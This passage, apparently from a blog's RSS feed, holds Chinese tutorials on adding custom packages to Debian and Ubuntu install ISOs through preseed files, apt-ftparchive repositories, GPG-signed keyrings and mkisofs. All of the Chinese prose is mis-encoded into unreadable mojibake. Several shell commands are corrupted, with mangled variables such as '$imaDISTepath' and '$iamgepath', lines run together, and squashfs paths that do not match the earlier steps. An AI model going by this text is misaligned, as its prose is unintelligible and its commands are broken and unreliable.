0x80</code></pre><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°Ubuntuçš„appendå­—æ®µé‡Œé¢æŒ‡æ˜äº†preseedçš„ä½ç½®file=/cdrom/preseed/ubuntu-server.seedï¼Œå› æ­¤æˆ‘ä»¬åœ¨debiançš„appendä¸­åŠ å…¥file=/cdrom/pressd.cfgç„¶åå°†å‘½ä»¤å†™å…¥å³å¯ã€‚</p><ul><li>è¿™é‡Œä½¿ç”¨preseed.cfgè€Œä¸é‡‡ç”¨preseed/xxxx.seedæ˜¯å› ä¸ºæˆ‘åœ¨debian wikiä¸Šçœ‹åˆ°ä»–ä»¬éƒ½é‡‡ç”¨preseed.cfgçš„å‘½åï¼Œå…¥ä¹¡éšä¿—ã€‚</li></ul><p>è¿™é‡Œå…¶å®åªç›¸å½“äºå®Œæˆäº†ä¸€åŠï¼Œå¯ä»¥çœ‹åˆ°ubuntuçš„txt.cfgæ¯”debiançš„æ€ä¹ˆå¤šäº†è¿™ä¹ˆå¤šï¼Œdebianè¿™åªæœ‰installï¼Œè¿˜æœ‰å›¾å½¢çš„installå’Œä¸€äº›checkä¹‹ç±»çš„é…ç½®å‘¢ï¼Ÿ</p><p>debiançš„isolinuxç›®å½•ä¸‹ä»”ç»†æŸ¥æ‰¾å¯ä»¥æ‰¾åˆ°gtk.cfgï¼Œå…¶å†…å®¹å¦‚ä¸‹</p><pre><code class="bash">default installguilabel installgui    menu label ^Graphical install    menu default    kernel /install.amd/vmlinuz    append desktop=xfce vga=788 initrd=/install.amd/gtk/initrd.gz --- quiet </code></pre><p>æ²¡é”™ä»åå­—å¯ä»¥çœ‹å‡ºï¼Œè¿™ä¸ªå°±æ˜¯å¸¦ç•Œé¢å®‰è£…ç³»ç»Ÿçš„é…ç½®æ–‡ä»¶ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ä¹Ÿéœ€è¦å°†preseedæ–‡ä»¶çš„ä½ç½®åŠ ä¸Šã€‚</p><p>åœ¨Ubuntuä¸­æˆ‘ä»¬é‡‡ç”¨çš„æ˜¯å°†</p><pre><code class="bash">d-i preseed/late_command string apt-install $packgename</code></pre><p>å†™å…¥åˆ°seedæ–‡ä»¶åº•éƒ¨ï¼Œè¿™ä¸ªçš„æ„æ€æ˜¯åœ¨å®‰è£…çš„æœ€åé˜¶æ®µæ‰§è¡Œpackageçš„å®‰è£…ï¼Œçœ‹èµ·æ¥ä¸å¤ªä¼˜é›…ã€‚<br>è¿™é‡Œæˆ‘ç»™å‡ºä¸€ç§æ–°çš„å†™æ³•<br>preseed.cfgï¼š</p><pre><code class="bash">d-i pkgsel/include string $packgename</code></pre><p>è¿™ä¸ªæ˜¯åœ¨å®‰è£…å®Œç³»ç»Ÿé»˜è®¤çš„è½¯ä»¶åŒ…åï¼Œå®‰è£…ä½ çš„è½¯ä»¶åŒ…ï¼ˆæ‰§è¡Œé˜¶æ®µä¸ºselect and install packageï¼‰</p><h2 id="5-ç”Ÿæˆiso"><a href="#5-ç”Ÿæˆiso" class="headerlink" title="5.ç”Ÿæˆiso"></a>5.ç”Ÿæˆiso</h2><p>è¿™é‡Œå’ŒUbuntuä¸€æ ·<br>å¯¹md5æ–‡ä»¶è¿›è¡Œç­¾å</p><pre><code class="bash">cd $imagepathfind -type f -print0 | sudo xargs -0 md5sum | grep -v isolinux/ | grep -v md5sum  |sudo tee md5sum.txt</code></pre><p>-b å’Œ -cæŒ‡å®šçš„è·¯å¾„éƒ½æ˜¯ç›¸å¯¹äº$imagepathæ¥è¯´çš„ï¼Œæœ€ç»ˆä¼š$imagepathä¸‹ç”Ÿæˆisoã€‚</p><pre><code class="bash">IMAGE=custom.isomkisofs -r -V &quot;Custom Ubuntu Install CD&quot; \            -cache-inodes \            -J -l -b isolinux/isolinux.bin \            -c isolinux/boot.cat -no-emul-boot \            -boot-load-size 4 -boot-info-table \            -o $IMAGE $imagepath</code></pre><h2 id="6-å…¶ä»–é™„åŠ preseedçš„æ–¹æ³•"><a href="#6-å…¶ä»–é™„åŠ preseedçš„æ–¹æ³•" class="headerlink" title="6.å…¶ä»–é™„åŠ preseedçš„æ–¹æ³•"></a>6.å…¶ä»–é™„åŠ preseedçš„æ–¹æ³•</h2><p>ç”±äºisoä¼šæä¾›å¤šç§å®‰è£…æ–¹å¼ï¼Œå› æ­¤å¾€æ¯ä¸ªå®‰è£…æ–¹å¼æŒ‡å®špreseedæœ‰ç‚¹éº»çƒ¦ï¼Œåœ¨debiançš„wikiä¸Šç»™å‡ºäº†ä¸‰ç§æ–¹å¼ã€‚</p><ul><li>å°†preseed.cfgé™„åŠ åˆ°initrd</li><li>æŒ‡å®špreseed.cfgçš„ä½ç½®ï¼ˆä¸Šé¢ä½¿ç”¨çš„æ–¹æ³•ï¼‰</li><li>ä»ç½‘ä¸Šä¸‹è½½preseed.cfg</li></ul><p>ä¸‹è½½preseedæœ‰ç‚¹éº»çƒ¦ï¼Œéœ€è¦æ­å»ºæä¾›ä¸‹è½½çš„æœåŠ¡å™¨ï¼Œè¿™é‡Œå°±ä¸å†å±•å¼€äº†ã€‚<br>é‡ç‚¹è®²è®²ç¬¬ä¸€ç§æ–¹æ³•ã€‚<br>debiané•œåƒæ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªinstall.amdçš„ç›®å½•ï¼Œæˆ‘ä»¬å°±ä½¿ç”¨è¿™ä¸ªç›®å½•.<br>è¿™é‡Œç»™å‡ºè„šæœ¬</p><pre><code>isopath=~/debianisochmod +w -R $isopath/install.amd/pushd $isopath/install.amdcat &gt; preseed.cfg &lt;&lt; EOF#ç”Ÿæˆpreseed.cfgæ–‡ä»¶d-i pkgsel/include string secagentEOF#æŸ¥æ‰¾æ‰€æœ‰çš„initrd.gzfor initrd in $(find $isopath/install.amd/ -name initrd.gz);do        gzip -d $initrd        echo preseed.cfg | cpio -H newc -o -A -F $(dirname $initrd)/initrd#å°†preseed.cfgé™„åŠ ä¸Šå»        gzip $(dirname $initrd)/initrddonerm -f preseed.cfgchmod -w -R $isopath/install.amd/popd</code></pre><h2 id="é™„å½•"><a href="#é™„å½•" class="headerlink" title="é™„å½•"></a>é™„å½•</h2><p>å¦‚æœä½ å¯¹äºpreseedæ–‡ä»¶æœ‰å…´è¶£<br>è¿™é‡Œç»™å‡ºUbuntuçš„preseedç¤ºä¾‹æ–‡ä»¶,ä½ ä¹Ÿå¯ä»¥åœ¨Ubunutçš„é•œåƒä¸‹æ‰¾åˆ°ï¼ˆç›®å½•doc\install\manual\example-preseed.txt.gzï¼‰<br>å¤ªé•¿æ‡’å¾—æ”¾ä¸Šæ¥äº†ï¼Œè‡ªå·±è§£å‹é•œåƒå»æ‰¾å§ã€‚</p>]]></content:encoded>
      
      <comments>http://romanarcher.github.io/post/5092e38f.html#disqus_thread</comments>
    </item>
    
    <item>
      <title>åœ¨Ubuntuå®‰è£…é•œåƒä¸­æ·»åŠ è½¯ä»¶åŒ…</title>
      <link>http://romanarcher.github.io/post/6a6ee787.html</link>
      <guid>http://romanarcher.github.io/post/6a6ee787.html</guid>
      <pubDate>Mon, 11 Nov 2019 07:54:42 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h2&gt;&lt;p&gt;æœ¬æ•™ç¨‹æ˜¯åœ¨ubuntu16.04 desktop amd64ä¸Šè¿›è¡Œç¼–è¾‘ã€‚&lt;br&gt;é•œåƒä¸ºubuntu16.04 server amd64ã€‚&lt;b
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>æœ¬æ•™ç¨‹æ˜¯åœ¨ubuntu16.04 desktop amd64ä¸Šè¿›è¡Œç¼–è¾‘ã€‚<br>é•œåƒä¸ºubuntu16.04 server amd64ã€‚<br>å‚è€ƒåœ°å€ï¼š<br><a href="https://help.ubuntu.com/community/InstallCDCustomization?action=show&redirect=InstallCDCustomizationHowTo" target="_blank" rel="noopener">InstallCDCustomization</a><br><a href="https://help.ubuntu.com/community/LiveCDCustomization" target="_blank" rel="noopener">LiveCDCustomization</a><br><a href="https://wiki.ubuntu.com/å®šåˆ¶Ubuntuå®‰è£…CD" target="_blank" rel="noopener">å®šåˆ¶Ubuntuå®‰è£…CD</a></p><p>è¿™é‡Œå¯¹æ¥ä¸‹æ¥ä½¿ç”¨çš„ä¸€äº›å˜é‡è¿›è¡Œè¯´æ˜</p><pre><code class="bash">$isopath        #isoæ–‡ä»¶çš„è·¯å¾„$mountpoint     #å°†isoæŒ‚è½½çš„ç‚¹$imagepath      #å°†isoæ–‡ä»¶å¤åˆ¶åˆ°çš„ç›®å½•$keybuild       #æ„å»ºubuntu-keyringåŒ…çš„ä½ç½®$yourkeyid      #ä½ è‡ªå·±ç”Ÿæˆçš„key$indicesDir     #ä¸‹è½½çš„indiceæ–‡ä»¶$DIST           #ubuntuçš„å¼€å‘ä»£å·,ä½¿ç”¨ç¬¬ä¸€ä¸ªå•è¯ï¼Œæ¯”å¦‚16.04ä¸ºxenial$version        #ubuntuçš„ç‰ˆæœ¬å·$aptftparchiveconf  #å­˜æ”¾apt-ftparchiveé…ç½®æ–‡ä»¶çš„ç›®å½•$APTCONF        #release.confçš„ä½ç½®</code></pre><h2 id="1-æ‹·è´é•œåƒå†…å®¹åˆ°ç¡¬ç›˜ä¸Š"><a href="#1-æ‹·è´é•œåƒå†…å®¹åˆ°ç¡¬ç›˜ä¸Š" class="headerlink" title="1.æ‹·è´é•œåƒå†…å®¹åˆ°ç¡¬ç›˜ä¸Š"></a>1.æ‹·è´é•œåƒå†…å®¹åˆ°ç¡¬ç›˜ä¸Š</h2><p>æŒ‚è½½é•œåƒ</p><pre><code class="bash">mount -o loop $isopath $mountpoint</code></pre><p>ä½¿ç”¨rsyncå¤åˆ¶æ–‡ä»¶åˆ°ç¡¬ç›˜</p><pre><code class="bash">rsync -av $mountpoint $imagepath</code></pre><p>æˆ–è€…ç›´æ¥ä½¿ç”¨cpå‘½ä»¤æ‹·è´</p><pre><code class="bash">mkdir -p $imagepathcp -a $mountpoint $imagepath</code></pre><ul><li>æ³¨æ„åœ¨å¤åˆ¶å®ŒåæŸ¥çœ‹ä¸€ä¸‹ï¼Œæ˜¯å¦.diskä¹Ÿå¤åˆ¶è¿‡å»äº†ï¼Œå¦‚æœæ²¡æœ‰ï¼Œæœ€ç»ˆé•œåƒå®‰è£…ä¼šå‡ºç°è¿™ä¸æ˜¯ä¸€å¼ UbuntuCDçš„è­¦å‘Šã€‚</li></ul><h2 id="2-åˆ›å»ºextrasç»„ä»¶"><a href="#2-åˆ›å»ºextrasç»„ä»¶" class="headerlink" title="2.åˆ›å»ºextrasç»„ä»¶"></a>2.åˆ›å»ºextrasç»„ä»¶</h2><pre><code class="bash">cd $imagepathmkdir -p pool/extras/</code></pre><p>æŠŠä½ æƒ³è¦å®‰è£…çš„.debåŒ…éƒ½æ”¾åˆ°pool/extras/ç›®å½•ä¸‹ã€‚</p><h2 id="3-ç”Ÿæˆæ–°çš„ubuntu-keyring-debæ¥å¯¹ä½ çš„CDè¿›è¡Œç­¾å"><a href="#3-ç”Ÿæˆæ–°çš„ubuntu-keyring-debæ¥å¯¹ä½ çš„CDè¿›è¡Œç­¾å" class="headerlink" title="3.ç”Ÿæˆæ–°çš„ubuntu-keyring.debæ¥å¯¹ä½ çš„CDè¿›è¡Œç­¾å"></a>3.ç”Ÿæˆæ–°çš„ubuntu-keyring.debæ¥å¯¹ä½ çš„CDè¿›è¡Œç­¾å</h2><p>æˆ‘ä»¬éœ€è¦ä½¿ç”¨GPGæ¥å¯¹releaseæ–‡ä»¶è¿›è¡Œç­¾åï¼Œå®‰è£…ç³»ç»Ÿä¼šæ ¹æ®æ‰€æŒæœ‰çš„Ubuntu-keyringåŒ…æ¥å¯¹å…¬é’¥ç­¾åè¿›è¡ŒéªŒè¯ã€‚<br>ä¸ºäº†å®Œæˆå¯†é’¥çš„ç”Ÿæˆä½ éœ€è¦ä¸‹è½½gpgåŒ…ã€‚<br>ç­¾åå¯†é’¥ç”Ÿæˆçš„å‘½ä»¤</p><pre><code class="bash">gpg --gen-key</code></pre><p>ä¸€åˆ‡éƒ½æŒ‰é»˜è®¤çš„æ¥å°±è¡Œï¼Œä¸è¿‡æ•™ç¨‹ä¸Šç§ç±»ä½¿ç”¨çš„æ˜¯DSA and Elgamalï¼Œå› æ­¤æˆ‘ä¹Ÿé‡‡ç”¨äº†è¿™ä¸ªç§ç±»ã€‚<br>åˆ—å‡ºkey</p><pre><code class="bash">gpg --list-keyspub   1024D/437D05B5 2006-09-08uid                  XXX Signing Key &lt;packages@xxx.example.org&gt;sub   2048g/79164387 2006-09-08</code></pre><p>ä½ ä¹Ÿå¯ä»¥åœ¨â€“list-keys åé¢åŠ å‚æ•°æ¥æŸ¥æ‰¾ç›¸å…³çš„key</p><p>ç”Ÿæˆå®Œå¯†é’¥åï¼Œæ„å»ºåŒ…å«è‡ªå·±å¯†é’¥çš„ubuntu-keyringåŒ…</p><pre><code class="bash">cd $keybuildsudo apt-get install fakeroot   apt-get source ubuntu-keyringcd ubuntu-keyring-2012.05.19/keyringsgpg --import &lt; ubuntu-archive-keyring.gpggpg --list-keys &quot;ä½ çš„keyçš„åå­—æˆ–è€…é‚®ç®±&quot;gpg --export FBB75451 437D05B5 C0B21F32 EFE21092 $yourkeyid &gt; ubuntu-archive-keyring.gpgcd ..    # ç°åœ¨å¤„äºubuntu-keyring-2012.05.19ç›®å½•ä¸­dpkg-buildpackage -rfakeroot -m&quot;Your Name &lt;your.email@your.host&gt;&quot; -k$yourkeyidcd ..  # ç°åœ¨å¤„äº$keybuildä¸­cp ubuntu-keyring*deb $imagepath/pool/main/u/ubuntu-keyring</code></pre><ul><li>dpkg-buildpackageä¼šå»rootä¸‹é¢å¯»æ‰¾ä½ çš„keyï¼Œæ‰€ä»¥æ¨èè¿™äº›è¿‡ç¨‹ä»¥rootè´¦å·è¿è¡Œã€‚</li></ul><h2 id="4-ç”Ÿæˆæ–°çš„filesystem-squashfs"><a href="#4-ç”Ÿæˆæ–°çš„filesystem-squashfs" class="headerlink" title="4.ç”Ÿæˆæ–°çš„filesystem.squashfs"></a>4.ç”Ÿæˆæ–°çš„filesystem.squashfs</h2><p>è§£å¼€filesystem.squashfs</p><pre><code class="bash">cd $imagepathunsquashfs install/filesystem.squashfs</code></pre><p>è¿™ä¸ªæ—¶DISTåœ¨installç›®å½•ä¸‹ä¼šå‡ºç°squashfs-rootç›®å½•<br>å°†ä½ çš„kDISTyå¯¼å…¥åˆ°ç›¸åº”çš„ç›®å½•</p><pre><code class="bash">cd $imaDISTepath/install/squashfs-rootgpg --export FBB75451 437D05B5 C0B21F32 EFE21092 $yourkeyid &gt; /usr/share/keyrings/ubuntu-archive-keyring.gpg gpg --export FBB75451 437D05B5 C0B21F32 EFE21092 $yourkeyid &gt; /etc/apt/trusted.gpg gpg --export FBB75451 437D05B5 C0B21F32 EFE21092 $yourkeyid &gt; /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg </code></pre><p>squashfs-rootåº”è¯¥æ˜¯ç›¸å½“äºæ²¡æœ‰å®‰è£…è½¯ä»¶å’Œé…ç½®çš„ubuntuç³»ç»Ÿæ–‡ä»¶ï¼Œå¦‚æœä½ éœ€è¦å¯¹ubuntuè¿›è¡Œä¸€äº›ä¸ªæ€§åŒ–é…ç½®ï¼Œå¯ä»¥å¯¹ç›¸åº”æ–‡ä»¶ä¿®æ”¹ï¼Œæ¯”å¦‚ä¿®æ”¹squashfs-rootä¸‹çš„/etc/apt/sources.listæ¥æ›´æ”¹æºä¹‹ç±»çš„æ“ä½œã€‚<br>é…åˆä¸Šchrootä¹Ÿå¯ä»¥è¿›è¡Œæ›´åŠ é«˜çº§çš„æ“ä½œ</p><p>ä¿®æ”¹å®Œåå°†å…¶å¤§å°è®°å½•åˆ°filesystem.size</p><pre><code class="bash">cd $imagepath/install/squashfs-rootdu -sx --block-size=1 ./ | cut -f1 &gt; $imagepath/install/filesystem.size</code></pre><p>é‡æ–°æ‰“åŒ…</p><pre><code class="bash">rm extract-cd/casper/filesystem.squashfsmksquashfs edit extract-cd/casper/filesystem.squashfs -nolzma</code></pre><ul><li>-nolzmaå‚æ•°åªé€‚ç”¨äºHardyåˆ°Karmicç‰ˆæœ¬ã€‚</li><li>squashfså¿…é¡»ä½¿ç”¨ä¸æ‚¨æ­£åœ¨å®šåˆ¶çš„CDä¸Šä½¿ç”¨çš„å†…æ ¸å…¼å®¹çš„mksquashfsç‰ˆæœ¬ç”Ÿæˆã€‚ä¾‹å¦‚ï¼Œæ‚¨ä¸èƒ½åœ¨karmicä¸Šç”Ÿæˆjauntyçš„squashfsï¼Œå› ä¸ºjauntyå†…æ ¸æ— æ³•æŒ‚è½½ä½¿ç”¨mksquashfsä»karmicå‡†å¤‡çš„squashfsã€‚</li></ul><h2 id="5-ä½¿ç”¨apt-ftparchiveæ¥æ„å»ºä»“åº“"><a href="#5-ä½¿ç”¨apt-ftparchiveæ¥æ„å»ºä»“åº“" class="headerlink" title="5.ä½¿ç”¨apt-ftparchiveæ¥æ„å»ºä»“åº“"></a>5.ä½¿ç”¨apt-ftparchiveæ¥æ„å»ºä»“åº“</h2><p>è·å–indicesæ–‡ä»¶</p><pre><code class="bash">mkdir -p $indicesDir cd $indicesDirDIST=$DISTfor SUFFIX in extra.main main main.debian-installer restricted restricted.debian-installer; do  wget http://archive.ubuntu.com/ubuntu/indices/override.$DIST.$SUFFIXdone</code></pre><p>æ¥ä¸‹æ¥åœ¨åˆ›å»ºapt-ftparchiveçš„é…ç½®æ–‡ä»¶<br>åˆ†åˆ«ä¸ºapt-ftparchive-deb.conf, apt-ftparchive-udeb.conf, apt-ftparchive-extras.conf,å’Œrelease.confï¼Œæ”¾åœ¨$aptftparchiveconfç›®å½•ä¸‹ã€‚</p><p>è¿™é‡Œç»™å‡ºç›¸å…³çš„é…ç½®æ–‡ä»¶<br>apt-ftparchive-deb.conf</p><pre><code class="bash">Dir {  ArchiveDir &quot;$imagepath&quot;;};TreeDefault {  Directory &quot;pool/&quot;;};BinDirectory &quot;pool/main&quot; {  Packages &quot;dists/$DIST/main/binary-amd64/Packages&quot;;  BinOverride &quot;$indicesDir/override.$DIST.main&quot;;  ExtraOverride &quot;$indicesDir/override.$DIST.extra.main&quot;;};BinDirectory &quot;pool/restricted&quot; { Packages &quot;dists/$DIST/restricted/binary-amd64/Packages&quot;; BinOverride &quot;$indicesDir/override.$DIST.restricted&quot;;};Default {  Packages {    Extensions &quot;.deb&quot;;    Compress &quot;. gzip&quot;;  };};Contents {  Compress &quot;gzip&quot;;};</code></pre><p>apt-ftparchive-udeb.conf</p><pre><code class="bash">Dir {  ArchiveDir &quot;$imagepath&quot;;};TreeDefault {  Directory &quot;pool/&quot;;};BinDirectory &quot;pool/main&quot; {  Packages &quot;dists/$DIST/main/debian-installer/binary-amd64/Packages&quot;;  BinOverride &quot;$indicesDir/override.$DIST.main.debian-installer&quot;;};BinDirectory &quot;pool/restricted&quot; {  Packages &quot;dists/$DIST/restricted/debian-installer/binary-amd64/Packages&quot;;  BinOverride &quot;$indicesDir/override.$DIST.restricted.debian-installer&quot;;};Default {  Packages {    Extensions &quot;.udeb&quot;;    Compress &quot;. gzip&quot;;  };};Contents {  Compress &quot;gzip&quot;;};</code></pre><p>apt-ftparchive-extras.conf</p><pre><code class="bash">Dir {  ArchiveDir &quot;$imagepath&quot;;};TreeDefault {  Directory &quot;pool/&quot;;};BinDirectory &quot;pool/extras&quot; {  Packages &quot;dists/$DIST/extras/binary-amd64/Packages&quot;;};Default {  Packages {    Extensions &quot;.deb&quot;;    Compress &quot;. gzip&quot;;  };};Contents {  Compress &quot;gzip&quot;;};</code></pre><p>release.conf</p><pre><code class="bash">APT::FTPArchive::Release::Origin &quot;Ubuntu&quot;;APT::FTPArchive::Release::Label &quot;Ubuntu&quot;;APT::FTPArchive::Release::Suite &quot;$DIST&quot;;APT::FTPArchive::Release::Version &quot;$version&quot;;APT::FTPArchive::Release::Codename &quot;$DIST&quot;;APT::FTPArchive::Release::Architectures &quot;amd64&quot;;APT::FTPArchive::Release::Components &quot;main restricted extras&quot;;APT::FTPArchive::Release::Description &quot;xxxxxx&quot;;</code></pre><p>åˆ›å»ºåŒ…çš„å¼•ç”¨</p><pre><code class="bash">cd $imagepathapt-ftparchive packages pool/extras &gt; dists/stable/extras/binary-amd64/Packagesgzip -c dists/stable/extras/binary-amd64/Packages | tee dists/stable/extras/binary-amd64/Packages.gz &gt; /dev/null</code></pre><p>å¼€å§‹æ„å»ºä»“åº“</p><pre><code class="bash">APTCONF=$aptftparchiveconf/release.confDIST=xenialcd $imagepathapt-ftparchive -c $APTCONF generate /opt/apt-ftparchive/apt-ftparchive-deb.confapt-ftparchive -c $APTCONF generate /opt/apt-ftparchive/apt-ftparchive-udeb.confapt-ftparchive -c $APTCONF generate /opt/apt-ftparchive/apt-ftparchive-extras.confapt-ftparchive -c $APTCONF release $imagepath/dists/$DIST &gt; $imagepath/dists/$DIST/Release</code></pre><p>å¯¹releaseæ–‡ä»¶ç­¾å</p><pre><code class="bash">cd $imagepathgpg --default-key $yourkeyid --output $imagepath/dists/$DIST/Release.gpg -ba $imagepath/dists/$DIST/Release</code></pre><h2 id="6-ç¼–è¾‘seedæ–‡ä»¶æ¥å®‰è£…"><a href="#6-ç¼–è¾‘seedæ–‡ä»¶æ¥å®‰è£…" class="headerlink" title="6.ç¼–è¾‘seedæ–‡ä»¶æ¥å®‰è£…"></a>6.ç¼–è¾‘seedæ–‡ä»¶æ¥å®‰è£…</h2><p>ç”Ÿæˆçš„isoä¼¼ä¹ä¸ä¼šå®‰è£…extrasé‡Œé¢çš„è½¯ä»¶ï¼Œè¿™é‡Œç»™å‡ºä¸€ä¸ªä¿®è¡¥çš„åŠæ³•ï¼Œä¿®æ”¹preseedç›®å½•ä¸‹çš„seedæ–‡ä»¶ã€‚</p><pre><code class="bash">chmod +w  $iamgepath/preseed/*.seedfor seed in $iamgepath/preseed/*.seed; do        echo &quot;d-i preseed/late_command string apt-install $packagename&quot; &gt;&gt; $seeddonechmod -w  $iamgepath/preseed/*.seed</code></pre><p>*è½¯ä»¶åå­—ä¼¼ä¹éƒ½æ˜¯å°å†™è‹¥å®‰è£…ä¸æˆåŠŸï¼Œå¯ä»¥åœ¨å®‰è£…ç•Œé¢æŒ‰ä¸‹alt+F2è¿›å…¥shellè„šæœ¬ç•Œé¢ï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥æŸ¥è¯¢ä½ çš„è½¯ä»¶åŒ…çš„åå­—ã€‚</p><pre><code class="bash">apt-cache search package_name</code></pre><h2 id="7-ç”Ÿæˆiso"><a href="#7-ç”Ÿæˆiso" class="headerlink" title="7.ç”Ÿæˆiso"></a>7.ç”Ÿæˆiso</h2><p>å¯¹md5æ–‡ä»¶è¿›è¡Œç­¾å</p><pre><code class="bash">cd $imagepathfind -type f -print0 | sudo xargs -0 md5sum | grep -v isolinux/ | grep -v md5sum  |sudo tee md5sum.txt</code></pre><p>-b å’Œ -cæŒ‡å®šçš„è·¯å¾„éƒ½æ˜¯ç›¸å¯¹äº$imagepathæ¥è¯´çš„ï¼Œæœ€ç»ˆä¼š$imagepathä¸‹ç”Ÿæˆisoã€‚</p><pre><code class="bash">IMAGE=custom.isomkisofs -r -V &quot;Custom Ubuntu Install CD&quot; \            -cache-inodes \            -J -l -b isolinux/isolinux.bin \            -c isolinux/boot.cat -no-emul-boot \            -boot-load-size 4 -boot-info-table \            -o $IMAGE $imagepath</code></pre><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>è¿™ä¸ªæ•™ç¨‹åªæ˜¯æˆ‘è·Ÿç€wikiä¸Šçš„æ•™ç¨‹ä¸€æ­¥ä¸€æ­¥åšçš„ï¼Œæœ‰è®¸å¤šæ­¥éª¤åº”è¯¥æ˜¯æ²¡å¿…è¦çš„ï¼Œä¸‹ä¸€èŠ‚å®šåˆ¶debiançš„ç³»ç»Ÿï¼Œå…¶ä¸­ä¼šæœ‰æ›´ç®€æ´çš„æ–¹æ³•ã€‚å¯ä»¥å…ˆæŒ‰ç…§debiançš„æ–¹æ³•è¯•è¯•ï¼Œå¦‚æœé€šä¸è¿‡å†çœ‹çœ‹Ubuntuçš„ï¼Œé€‰æ‹©ä¸€äº›æ­¥éª¤æ·»åŠ ä¸Šã€‚<br><a href="https://doasromansdo.github.io/post/5092e38f.html#more" target="_blank" rel="noopener">åœ¨Debianå®‰è£…é•œåƒä¸­æ·»åŠ è½¯ä»¶åŒ…</a></p><h2 id="é™„å½•"><a href="#é™„å½•" class="headerlink" title="é™„å½•"></a>é™„å½•</h2><h3 id="A-é•œåƒå®‰è£…æ—¶å¦‚ä½•è°ƒè¯•"><a href="#A-é•œåƒå®‰è£…æ—¶å¦‚ä½•è°ƒè¯•" class="headerlink" title="A.é•œåƒå®‰è£…æ—¶å¦‚ä½•è°ƒè¯•"></a>A.é•œåƒå®‰è£…æ—¶å¦‚ä½•è°ƒè¯•</h3><p>alt+F1 å¯ä»¥è¿›å…¥å¯è§†åŒ–ç•Œé¢ï¼Œä¹Ÿå°±æ˜¯æ­£å¸¸çš„Ubuntuå®‰è£…ç•Œé¢ã€‚<br>alt+F2 è¿›å…¥äº¤äº’å¼shellç•Œé¢ï¼Œæ­¤æ—¶åœ¨isolinuxå†…ï¼Œå¯ä»¥é€šè¿‡chroot /targetæ¥è¿›å…¥æ­£åœ¨å®‰è£…çš„Ubuntuç³»ç»Ÿã€‚<br>alt+F4 æŸ¥çœ‹æ—¥å¿—ï¼ŒåŸºæœ¬çŸ¥é“æ˜¯å“ªä¸ªåœ°æ–¹å®‰è£…ä¸æˆåŠŸã€‚</p><h3 id="B-ubuntuç‰ˆæœ¬ä»¥åŠåç§°å¯¹åº”"><a href="#B-ubuntuç‰ˆæœ¬ä»¥åŠåç§°å¯¹åº”" class="headerlink" title="B.ubuntuç‰ˆæœ¬ä»¥åŠåç§°å¯¹åº”"></a>B.ubuntuç‰ˆæœ¬ä»¥åŠåç§°å¯¹åº”</h3><table><thead><tr><th align="center">ç‰ˆæœ¬å·</th><th align="center">å¼€å‘ä»£å·</th><th align="center">å†…æ ¸ç‰ˆæœ¬</th></tr></thead><tbody><tr><td align="center">4.10</td><td align="center">Warty Warthog</td><td align="center">2.6.8</td></tr><tr><td align="center">5.04</td><td align="center">Hoary Hedgehog</td><td align="center">2.6.10</td></tr><tr><td align="center">5.10</td><td align="center">Breezy Badger</td><td align="center">2.6.12</td></tr><tr><td align="center">6.06LTS</td><td align="center">Dapper Drake</td><td align="center">2.6.15</td></tr><tr><td align="center">6.10</td><td align="center">Edgy Eft</td><td align="center">2.6.17</td></tr><tr><td align="center">7.04</td><td align="center">Feisty Fawn</td><td align="center">2.6.20</td></tr><tr><td align="center">7.10</td><td align="center">Gutsy Gibbon</td><td align="center">2.6.22</td></tr><tr><td align="center">8.04LTS</td><td align="center">Hardy Heron</td><td align="center">2.6.24</td></tr><tr><td align="center">8.10</td><td align="center">Intrepid Ibex</td><td align="center">2.6.27</td></tr><tr><td align="center">9.04</td><td align="center">Jaunty Jackalope</td><td align="center">2.6.28</td></tr><tr><td align="center">9.10</td><td align="center">Karmic Koala</td><td align="center">2.6.31</td></tr><tr><td align="center">10.04LTS</td><td align="center">Lucid Lynx</td><td align="center">2.6.32</td></tr><tr><td align="center">10.10</td><td align="center">Maverick Meerkat</td><td align="center">2.6.35</td></tr><tr><td align="center">11.04</td><td align="center">Natty Narwhal</td><td align="center">2.6.38</td></tr><tr><td align="center">11.10</td><td align="center">Oneiric Ocelot</td><td align="center">3.0</td></tr><tr><td align="center">12.04LTS</td><td align="center">Precise Pangolin</td><td align="center">3.2</td></tr><tr><td align="center">12.10</td><td align="center">Quantal Quetzal</td><td align="center">3.5</td></tr><tr><td align="center">13.04</td><td align="center">Raring Ringtail</td><td align="center">3.8</td></tr><tr><td align="center">13.10</td><td align="center">Saucy Salamander</td><td align="center">3.11</td></tr><tr><td align="center">14.04LTS</td><td align="center">Trusty Tahr</td><td align="center">3.13</td></tr><tr><td align="center">14.10</td><td align="center">Utopic Unicorn</td><td align="center">3.16</td></tr><tr><td align="center">15.04</td><td align="center">Vivid Vervet</td><td align="center">3.19</td></tr><tr><td align="center">15.10</td><td align="center">Wily Werewolf</td><td align="center">4.2</td></tr><tr><td align="center">16.04LTS</td><td align="center">Xenial Xerus</td><td align="center">4.4</td></tr><tr><td align="center">16.10</td><td align="center">Yakkety Yak</td><td align="center">4.8</td></tr><tr><td align="center">17.04</td><td align="center">Zesty Zapus</td><td align="center">4.10</td></tr><tr><td align="center">17.10</td><td align="center">Artful Aardvark</td><td align="center">4.13</td></tr><tr><td align="center">18.04LTS</td><td align="center">Bionic Beaver</td><td align="center">4.15</td></tr><tr><td align="center">18.10</td><td align="center">Cosmic Cuttlefish</td><td align="center">4.18</td></tr><tr><td align="center">19.04</td><td align="center">Disco Dingo</td><td align="center">5.0</td></tr><tr><td align="center">19.10</td><td align="center">Eoan Ermine</td><td align="center">5.3</td></tr><tr><td align="center"><a href="https://zh.wikipedia.org/wiki/Ubuntuå‘è¡Œç‰ˆåˆ—è¡¨" target="_blank" rel="noopener">ä¸­æ–‡ç»´åŸº-Ubuntuå‘è¡Œç‰ˆåˆ—è¡¨</a></td><td align="center"></td><td 